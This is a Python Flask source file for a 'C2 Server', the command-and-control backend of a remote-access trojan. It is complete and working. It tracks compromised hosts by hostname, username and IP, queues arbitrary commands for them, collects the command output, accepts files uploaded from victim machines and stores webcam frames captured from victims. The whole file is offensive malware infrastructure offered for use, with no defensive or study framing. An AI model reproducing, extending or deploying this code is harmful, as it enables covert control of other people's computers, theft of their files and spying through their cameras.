#!/usr/bin/env python3
"""
Fixed C2 Server - Complete Version
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import base64
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Database setup
DATABASE = 'c2_server.db'

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            arch TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT,
            camera_count INTEGER DEFAULT 0
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT,
            output TEXT,
            created_at REAL,
            executed_at REAL
        )
    ''')
    
    # Files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filesize INTEGER,
            uploaded_at REAL
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# === CLIENT ENDPOINTS ===

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client checkin"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO clients 
            (id, hostname, username, os, arch, ip, last_seen, status, camera_count)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            client_id,
            data.get('hostname', 'unknown'),
            data.get('username', 'unknown'),
            data.get('os', 'unknown'),
            data.get('arch', 'unknown'),
            request.remote_addr,
            time.time(),
            'online',
            data.get('camera_count', 0)
        ))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Checkin: {client_id} ({data.get('hostname')})")
        
        return jsonify({
            'status': 'ok',
            'timestamp': time.time()
        }), 200
        
    except Exception as e:
        print(f"[-] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        cmd_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (cmd_id, client_id, command, 'pending', time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Command: {cmd_id[:8]} -> {client_id}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Mark as sent
        cursor.execute('''
            UPDATE commands SET status = 'sent'
            WHERE client_id = ? AND status = 'pending'
        ''', (client_id,))
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Submit command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, executed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Result: {cmd_id[:8]} -> {len(output)} chars")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f"[-] Result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_result(cmd_id):
    """Get command result"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'status': row['status'],
                'output': row['output'] or '',
                'command': row['command']
            }), 200
        else:
            return jsonify({'error': 'Command not found'}), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === FILE TRANSFER ENDPOINTS ===

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client_id'}), 400
        
        # Create uploads directory
        upload_dir = 'uploads'
        os.makedirs(upload_dir, exist_ok=True)
        
        # Save file
        filename = f"{client_id}_{int(time.time())}_{file.filename}"
        filepath = os.path.join(upload_dir, filename)
        file.save(filepath)
        
        # Save to database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filesize, uploaded_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (str(uuid.uuid4()), client_id, file.filename, filepath, 
              os.path.getsize(filepath), time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Upload: {client_id} -> {file.filename}")
        
        return jsonify({
            'success': True,
            'filename': file.filename,
            'size': os.path.getsize(filepath)
        }), 200
        
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/<client_id>', methods=['GET'])
def list_files(client_id):
    """List files for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, filename, filesize, uploaded_at 
            FROM files 
            WHERE client_id = ?
            ORDER BY uploaded_at DESC
        ''', (client_id,))
        
        files = []
        for row in cursor.fetchall():
            files.append({
                'id': row['id'],
                'filename': row['filename'],
                'size': row['filesize'],
                'uploaded_at': row['uploaded_at'],
                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S')
            })
        
        conn.close()
        return jsonify({'files': files}), 200
        
    except Exception as e:
        return jsonify({'files': []}), 500

@app.route('/api/download/<file_id>', methods=['GET'])
def download_file(file_id):
    """Download file"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT filepath, filename FROM files WHERE id = ?', (file_id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row or not os.path.exists(row['filepath']):
            return jsonify({'error': 'File not found'}), 404
        
        return send_file(
            row['filepath'],
            as_attachment=True,
            download_name=row['filename']
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === CAMERA ENDPOINTS ===

@app.route('/api/camera/frame', methods=['POST'])
def camera_frame():
    """Receive camera frame"""
    try:
        data = request.form
        client_id = data.get('client_id')
        frame = data.get('frame')
        
        if not client_id or not frame:
            return jsonify({'error': 'Missing data'}), 400
        
        # Save frame
        camera_dir = 'camera_frames'
        os.makedirs(camera_dir, exist_ok=True)
        
        filename = f"{client_id}_{int(time.time())}.jpg"
        filepath = os.path.join(camera_dir, filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(frame))
        
        print(f"[+] Camera: {client_id} -> {filename}")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === MANAGEMENT ENDPOINTS ===

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
        
        clients = []
        now = time.time()
        
        for row in cursor.fetchall():
            # Calculate status
            status = 'online' if (now - row['last_seen']) < 60 else 'offline'
            
            clients.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'arch': row['arch'],
                'ip': row['ip'],
                'status': status,
                'camera_count': row['camera_count'],
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S')
            })
        
        conn.close()
        return jsonify({'clients': clients}), 200
        
    except Exception as e:
        print(f"[-] Clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server stats"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Counts
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE last_seen > ?', (time.time() - 60,))
        online_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
        pending_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files')
        total_files = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'total_clients': total_clients,
            'online_clients': online_clients,
            'total_commands': total_commands,
            'pending_commands': pending_commands,
            'total_files': total_files,
            'server_time': time.time()
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'ok',
        'timestamp': time.time(),
        'version': '2.0'
    }), 200

@app.route('/')
def index():
    """Home page"""
    return '''
    <html>
    <head>
        <title>C2 Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .container { max-width: 800px; margin: 0 auto; }
            .card { background: #f5f5f5; padding: 20px; margin: 20px 0; border-radius: 5px; }
            .endpoint { background: #e9e9e9; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🖥️ C2 Control Server</h1>
            <p>Server is running and ready for connections.</p>
            
            <div class="card">
                <h3>API Endpoints:</h3>
                <div class="endpoint"><b>POST</b> /api/checkin - Client registration</div>
                <div class="endpoint"><b>POST</b> /api/command - Send commands</div>
                <div class="endpoint"><b>GET</b> /api/commands/&lt;id&gt; - Get commands</div>
                <div class="endpoint"><b>POST</b> /api/result - Submit results</div>
                <div class="endpoint"><b>GET</b> /api/clients - List clients</div>
                <div class="endpoint"><b>GET</b> /api/stats - Server stats</div>
            </div>
            
            <p>Use the C2 console for control: <code>python c2_console.py http://localhost:5000</code></p>
        </div>
    </body>
    </html>
    '''

def cleanup():
    """Cleanup old data"""
    while True:
        time.sleep(300)  # Run every 5 minutes
        try:
            conn = get_db()
            cursor = conn.cursor()
            
            # Remove old clients (24 hours)
            cursor.execute('DELETE FROM clients WHERE last_seen < ?', (time.time() - 86400,))
            
            # Remove old commands (7 days)
            cursor.execute('DELETE FROM commands WHERE created_at < ?', (time.time() - 604800,))
            
            # Remove old files (30 days)
            cursor.execute('DELETE FROM files WHERE uploaded_at < ?', (time.time() - 2592000,))
            
            conn.commit()
            conn.close()
            
            print(f"[+] Cleanup completed at {datetime.now().strftime('%H:%M:%S')}")
            
        except Exception as e:
            print(f"[-] Cleanup error: {e}")

if __name__ == '__main__':
    # Initialize
    init_db()
    
    # Start cleanup thread
    threading.Thread(target=cleanup, daemon=True).start()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║                    C2 SERVER v2.0                        ║
║                   Fixed & Complete                       ║
╚══════════════════════════════════════════════════════════╝

    📊 Database: {DATABASE}
    📁 Uploads: ./uploads/
    📷 Camera: ./camera_frames/
    
    🔗 Server running on: http://0.0.0.0:5000
    📡 API ready for connections
    
    Endpoints:
    • POST /api/checkin     - Client checkin
    • POST /api/command     - Send command
    • GET  /api/clients     - List clients
    • POST /api/upload      - File upload
    • GET  /api/health      - Health check
    
    Starting server...
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
